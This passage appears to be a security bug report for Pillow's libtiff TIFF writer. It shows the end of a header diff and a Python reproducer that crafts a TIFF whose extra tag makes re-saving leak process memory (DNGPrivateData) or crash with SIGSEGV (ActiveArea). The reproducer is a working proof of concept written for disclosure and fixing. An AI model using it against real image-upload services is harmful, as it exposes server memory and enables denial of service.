ate, ttag_t tag, ...) {\n     // after tif_dir.c->TIFFSetField.\ndiff --git a/src/libImaging/TiffDecode.h b/src/libImaging/TiffDecode.h\nindex c31d0b9d8..ee1e4a5f9 100644\n--- a/src/libImaging/TiffDecode.h\n+++ b/src/libImaging/TiffDecode.h\n@@ -41,6 +41,14 @@ ImagingLibTiffMergeFieldInfo(\n     ImagingCodecState state, TIFFDataType field_type, int key, int is_var_length\n );\n extern int\n+ImagingLibTiffFindField(\n+    ImagingCodecState state,\n+    int key,\n+    TIFFDataType *field_type,\n+    int *passcount,\n+    int *writecount\n+);\n+extern int\n ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...);\n \n /*\n```\n\n## The reproducer\n\n<details>\n<summary>Reproducer — <code>repro</code>, 2,545 bytes (click to open)</summary>\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to\n# TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is\n# consumed as a byte COUNT (DNGPrivateData 50740 -> N bytes of process memory written\n# into the output) or as a POINTER (ActiveArea 50829 -> SIGSEGV).  Application side is\n# the ordinary \"open upload, save as TIFF\" (compression is inherited -> libtiff writer).\nimport io, struct, subprocess, sys, resource\nfrom PIL import Image\n\ndef upload(tag, value):\n    \"\"\"Pillow-written 16x16 LZW TIFF, plus one extra IFD entry <tag> LONG[1] = value.\"\"\"\n    b = io.BytesIO()\n    Image.new(\"RGB\", (16, 16), \"red\").save(b, \"TIFF\", compression=\"tiff_lzw\")\n    data = bytearray(b.getvalue()); assert data[:4] == b\"II*\\0\"\n    (off,) = struct.unpack_from(\"<I\", data, 4)\n    (n,) = struct.unpack_from(\"<H\", data, off)\n    ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]\n    ents.append(struct.pack(\"<HHII\", tag, 4, 1, value))\n    ents.sort(key=lambda e: struct.unpack_from(\"<H\", e)[0])\n    data += b\"\\0\" * (len(data) & 1); new_off = len(data)\n    data += struct.pack(\"<H\", len(ents)) + b\"\".join(ents) + struct.pack(\"<I\", 0)\n    struct.pack_into(\"<I\", data, 4, new_off)\n    return bytes(data)\n\ndef resave(src):                       # the whole \"service\"\n    im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, \"TIFF\")\n    return out.getvalue()\n\nif len(sys.argv) > 1 and sys.argv[1] == \"child\":\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resave(upload(50829, 64)); sys.exit(0)\n\nprint(\"PIL core:\", Image.core.__file__)\nctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)\nprint(\"control  tag 65000=4096 ->\", repr(ctl))\n\nN = 65536\nsrc = upload(50740, N)\ntry:\n    v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)\nexcept (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag\n    v = e\nleak = isinstance(v, bytes) and len(v) == N and v[:64] not in src\nprint(f\"leak     tag 50740={N} from a {len(src)}-byte upload ->\",\n      f\"{len(v)} bytes not present in input, head {v[:32].hex()}\" if leak else repr(v)[:80])\nif leak:\n    so = open(Image.core.__file__, \"rb\").read()\n    print(\"         leaked bytes found in _imaging.so at file offset\", hex(so.find(v[:256])))\n\nrc = subprocess.call([sys.executable, __file__, \"child\"])\ncrash = rc in (-11, 139)\nprint(\"crash    tag 50829=64 -> child exit\", rc, \"(SIGSEGV)\" if crash else \"\")\nprint(\"BUG\" if leak or crash else \"OK\")\n```\n</details>\n\n---",
